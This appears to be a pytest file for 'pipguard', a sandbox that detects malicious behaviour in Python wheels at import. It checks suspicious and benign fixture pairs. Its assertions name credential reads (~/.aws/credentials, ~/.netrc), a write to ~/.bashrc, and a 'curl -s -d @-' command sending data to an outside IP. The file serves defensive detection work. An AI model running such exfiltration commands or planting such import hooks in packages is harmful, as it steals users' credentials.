"""Track B: every behavioural fixture pair through the real sandbox (needs Docker).

Run with ``uv run pytest -m docker``. Wheels are built at test time from the source
trees in tests/fixtures/behaviour/ (no .whl in git) into a temp dir that is passed as
``fixtures_root``, so the FR-4.10 policy guard admits exactly these files.

Installing a wheel runs no package code, so behaviour shows up at import (and via a
target ``.pth`` at interpreter start), never in the install step.
"""

from __future__ import annotations

import hashlib
import subprocess
from pathlib import Path

import pytest

from pipguard import sandbox
from pipguard.models import (
    Artifact,
    BehaviorTrace,
    Completeness,
    Config,
    FetchedPackage,
    PackageMetadata,
    PackageSpec,
    Timeouts,
)
from scripts.make_wheel import build_wheel

pytestmark = pytest.mark.docker

SRC = Path(__file__).parent / "fixtures" / "behaviour"
IMAGE = sandbox.DEFAULT_IMAGE
CONFIG = Config()


def _docker(*args: str, timeout: float = 60) -> subprocess.CompletedProcess[bytes]:
    return subprocess.run(["docker", *args], capture_output=True, timeout=timeout, check=False)


@pytest.fixture(scope="module")
def build_dir(tmp_path_factory: pytest.TempPathFactory) -> Path:
    try:
        ok = _docker("info").returncode == 0
    except (OSError, subprocess.TimeoutExpired):
        ok = False
    if not ok:
        pytest.skip("docker daemon not available")
    # Always (re)build: layers are cached, and a stale image would test an old runner.
    res = _docker(
        "build", "-q", "-f", "sandbox/sandbox.Dockerfile", "-t", IMAGE, str(sandbox.REPO_ROOT),
        timeout=900,
    )  # fmt: skip
    assert res.returncode == 0, res.stderr.decode(errors="replace")[-2000:]
    return tmp_path_factory.mktemp("fixture-wheels")


def _artifact(path: Path) -> Artifact:
    data = path.read_bytes()
    return Artifact(
        filename=path.name,
        kind="wheel",  # type: ignore[arg-type]
        sha256=hashlib.sha256(data).hexdigest(),
        size=len(data),
        path=str(path),
        python_tag="py3",
        platform_tag="any",
    )


def _wheel(out: Path, src: Path, requires: list[str] | None = None) -> Path:
    name = next(p.name for p in src.iterdir() if p.is_dir())
    files: dict[str, str | bytes] = {
        p.relative_to(src).as_posix(): p.read_bytes()
        for p in sorted(src.rglob("*"))
        if p.is_file() and "__pycache__" not in p.parts
    }
    return build_wheel(out, name, "1.0", files, requires)


def _package(out: Path, wheel: Path, deps: list[Path] | None = None) -> FetchedPackage:
    return FetchedPackage(
        spec=PackageSpec(name=wheel.name.split("-")[0].replace("_", "-"), version="1.0"),
        artifacts=[_artifact(wheel)],
        metadata=PackageMetadata(),
        declared_deps=[_artifact(d) for d in deps or []],
        origin="fixture",
    )


_cache: dict[tuple[str, str], BehaviorTrace] = {}


def _run(build_dir: Path, case: str, variant: str, config: Config = CONFIG) -> BehaviorTrace:
    key = (case, variant)
    if key not in _cache:
        out = build_dir / case / variant
        pkg = _package(out, _wheel(out, SRC / case / variant))
        _cache[key] = sandbox.run(pkg, config=config, image=IMAGE, fixtures_root=build_dir)
    return _cache[key]


def _observations(t: BehaviorTrace, step: str | None = None) -> list[object]:
    obs = [*t.connects, *t.credential_reads, *t.subprocesses, *t.writes_outside_allowed]
    return [o for o in obs if step is None or o.step == step]  # type: ignore[attr-defined]


PAIRS = ["connect_import", "credential_exfil", "pth_import", "obfuscated_exec", "write_outside"]


@pytest.mark.parametrize("case", PAIRS)
def test_suspicious_fixture_is_observed(build_dir: Path, case: str) -> None:
    t = _run(build_dir, case, "suspicious")
    assert t.completeness is Completeness.COMPLETE, t.completeness_reason
    assert t.image_digest and t.image_digest.startswith("sha256:")
    assert not _observations(t, "install")  # a wheel install runs no package code
    if case == "connect_import":
        assert [(c.family, c.address, c.port) for c in t.connects] == [
            ("AF_INET", "203.0.113.10", 443)
        ]
    elif case == "credential_exfil":
        assert [c.path for c in t.credential_reads] == ["/home/sandbox/.aws/credentials"]
        # dash looks curl up with stat(), so the observed execve is sh with curl in argv
        assert ["sh", "-c", "curl -s -d @- https://203.0.113.10/c"] in [
            s.argv for s in t.subprocesses
        ]
    elif case == "pth_import":
        assert [s.argv for s in t.subprocesses] == [["sh", "-c", "true"]]
    elif case == "obfuscated_exec":
        assert [c.path for c in t.credential_reads] == ["/home/sandbox/.netrc"]
    elif case == "write_outside":
        assert [w.path for w in t.writes_outside_allowed] == ["/home/sandbox/.bashrc"]


@pytest.mark.parametrize("case", PAIRS)
def test_benign_counterexample_is_quiet(build_dir: Path, case: str) -> None:
    t = _run(build_dir, case, "benign")
    assert t.completeness is Completeness.COMPLETE, t.completeness_reason
    assert _observations(t) == []
    assert t.imported_modules == [f"fx_{case}_benign"]


def test_real_pip_install_trace_is_clean(build_dir: Path) -> None:
    """The install filter must not warn on every package (W_CONNECT_INSTALL et al.)."""
    t = _run(build_dir, "connect_import", "benign")
    install = [s for s in t.steps if s.step == "install"]
    assert install and install[0].exit_code == 0
    assert [c for c in t.connects if c.step == "install"] == []
    assert [s for s in t.subprocesses if s.step == "install"] == []
    assert _observations(t, "install") == []


def test_dependency_pth_is_not_attributed_to_target(build_dir: Path) -> None:
    out = build_dir / "noisy_dependency"
    dep = _wheel(out / "dep", SRC / "noisy_dependency" / "dep")
    target = _wheel(out / "target", SRC / "noisy_dependency" / "target", ["fx-noisy-dep"])
    pkg = _package(out, target, [dep])
    t = sandbox.run(pkg, config=CONFIG, image=IMAGE, fixtures_root=build_dir)
    assert t.completeness is Completeness.COMPLETE, t.completeness_reason
    assert t.imported_modules == ["fx_noisy_target"]  # it imported its dependency fine
    assert t.connects == []
    assert _observations(t) == []


def test_import_timeout(build_dir: Path) -> None:
    cfg = Config(timeouts=Timeouts(import_s=5))
    t = _run(build_dir, "timeout", "suspicious", cfg)
    assert t.completeness is Completeness.TIMEOUT
    assert [s.timed_out for s in t.steps] == [False, True]


def test_import_failed(build_dir: Path) -> None:
    t = _run(build_dir, "import_failed", "suspicious")
    assert t.completeness is Completeness.IMPORT_FAILED
    assert "RuntimeError" in t.completeness_reason


def test_no_container_left_behind(build_dir: Path) -> None:
    _run(build_dir, "connect_import", "suspicious")
    res = _docker("ps", "-a", "-q", "--filter", "name=pipguard-")
    assert res.stdout.strip() == b""
